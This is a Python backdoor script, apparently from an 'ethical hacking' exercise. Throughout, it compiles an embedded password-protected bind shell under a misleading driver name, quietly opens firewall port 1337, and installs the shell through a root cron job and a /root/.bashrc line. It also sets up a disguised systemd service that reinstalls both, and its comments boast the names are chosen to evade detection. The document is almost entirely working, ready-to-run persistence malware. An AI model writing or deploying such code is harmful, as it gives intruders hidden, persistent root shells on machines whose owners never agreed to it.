# This is a python backdoor script that does three things - it adds a backdoor to
# a cron job, it adds another backdoor to the root users' bashrc file, and then also
# creates a service that checks if those two backdoors still exist and reinstalls
# them if they aren't. The cron job and bashrc backdoors should be relatively easy
# to detect, but the service should be harder to find.

import os
import sys
import shutil
import stat
from crontab import CronTab

# Writeup link: https://docs.google.com/document/d/1_-PNqH7t-okP9s3QO9jVoFNaFT9FZDwlNMpmf9LssYo/edit?usp=sharing
# You HAVE to install gcc, python3, and python-crontab for this to work

# configurables
script_file_name = "enable_extensions.py" # this NEEDS TO match the name of this file for it to work
reverse_shell_file_name = "intel_i486_linux_driver" # preferrably a misleading name!
port = 1337 # port that reverse shell listens on
password = "37h1c4l_h4ck1n6" # password that must be entered into when netcatting to spawn shell

##################################################################################################################
# THIS C CODE IS NOT MINE. SOURCE: https://mmquant.net/creating-password-protected-tcp-bind-shell-shellcode-x64/ #
##################################################################################################################
reverse_shell_code = \
'#include <stdio.h>\n\
#include <sys/socket.h>\n\
#include <netinet/ip.h>\n\
#include <arpa/inet.h>\n\
#include <unistd.h>\n\
#include <string.h>\n\
\n\
int main()\n\
{{\n\
    // 1. Create socket\n\
    int listen_socket_fd = socket(AF_INET, SOCK_STREAM, 0);\n\
\n\
    // 2. Bind socket\n\
    struct sockaddr_in addr;\n\
    addr.sin_family = AF_INET;\n\
    addr.sin_port = htons({});\n\
    addr.sin_addr.s_addr = INADDR_ANY;\n\
    bind(listen_socket_fd, (struct sockaddr *)&addr, sizeof(addr));\n\
\n\
    // 3. Set socket into passive listening mode\n\
    listen(listen_socket_fd, 0);\n\
\n\
    // 4. Handle incoming connection\n\
    int connected_socket_fd = accept(listen_socket_fd, NULL, NULL);\n\
\n\
    // 5. Duplicate stdin, stdout and stderr file descriptors\n\
    dup2(connected_socket_fd, STDIN_FILENO);\n\
    dup2(connected_socket_fd, STDOUT_FILENO);\n\
    dup2(connected_socket_fd, STDERR_FILENO);\n\
\n\
    // 6. Check password\n\
    char buf[16];\n\
    char password[] = "{}";\n\
    read(connected_socket_fd, buf, 16);\n\
    buf[strcspn(buf, "\\n")] = 0;\n\
    if (strcmp(password, buf) == 0)\n\
    {{\n\
        // 7. Spawn shell\n\
        execve("/bin/sh", NULL, NULL);\n\
    }}\n\
}}'.format(port, password)

# Helper function for compiling and copying backdoor executable
def make_backdoor(directory):
    # create file, compile it, move to wanted directory, then delete temp file
    with open("temp.c", "w+") as backdoor:
        backdoor.write(reverse_shell_code)
        backdoor.close()
    os.system("gcc temp.c -o " + reverse_shell_file_name)
    shutil.copyfile(reverse_shell_file_name, "/" + directory + "/" + reverse_shell_file_name)
    os.chmod("/" + directory + "/" + reverse_shell_file_name, stat.S_IEXEC) # give it execute permission
    os.system("rm temp.c") 
    os.system("rm " + reverse_shell_file_name) 

# First, open port quietly
os.system("firewall-cmd --add-port={}/tcp -q".format(port))
os.system("firewall-cmd --zone=public --permanent --add-port={}/tcp -q".format(port))

# First, check if cron job backdoor already exists
flag1 = False
cron = CronTab(user='root')
for job in cron:
    if job.command == '/etc/' + reverse_shell_file_name:
        flag1 = True

# Then create backdoor cron job for root if not already installed
if (not flag1) :
    # make backdoor file in bin
    make_backdoor("etc")
    # Create cron job
    job = cron.new(command='/etc/{}'.format(reverse_shell_file_name))
    job.minute.every(5)
    job.enable()
    cron.write()

# Now check if bashrc backdoor exists
flag2 = False
with open("/root/.bashrc", "r") as bashrc: # read mode
    if ('/bin/' + reverse_shell_file_name) in bashrc.read():
        flag2 = True
    # If not, install backdoor in user's bashrc file
    if (not flag2) :
        # make backdoor file in etc
        make_backdoor("bin")
        bashrc.close()
        # add backdoor to bashrc file
        with open("/root/.bashrc", "a") as bashrc2: # append mode
            bashrc2.write("\n")
            bashrc2.write("(/bin/" + reverse_shell_file_name + " & )\n") # ampersand and parenthesis make it quiet
            bashrc2.close()

# Finally, create service that runs *this* python script to try and keep backdoors installed
# (if the service doesn't already exist)
# names are specifically very tricky to throw off detection
if not os.path.isfile("/lib/systemd/system/systemd-cmd-extension.service") :
    # this line copies this script to the service directory. in a real scenario I would code
    # this to be in a compiled language so the source code isnt readable but whatever lol
    shutil.copy(__file__, '/lib/systemd/system/' + script_file_name) 
    with open("/lib/systemd/system/systemd-cmd-extension.service", "w+") as service:
        service.write("[Unit]\n\
                        Description=Permit Command Extensions\n\
                        \n\
                        [Service]\n\
                        Type=simple\n\
                        ExecStart=/usr/bin/python3 /lib/systemd/system/{}\n\
                        \n\
                        [Install]\n\
                        WantedBy=multi-user.target".format(script_file_name))
        service.close()
    os.chmod("/lib/systemd/system/systemd-cmd-extension.service", 0o644)
    os.system("systemctl enable systemd-cmd-extension.service")

# should be good to go now! both backdoors are enabled and the service has been
# started. upon reboot and/or every 15 minutes, the backdoors will run and the service will
# check to make sure they're still in place and reinstall them if not.

# hi if you're on an infected system and you're reading this :)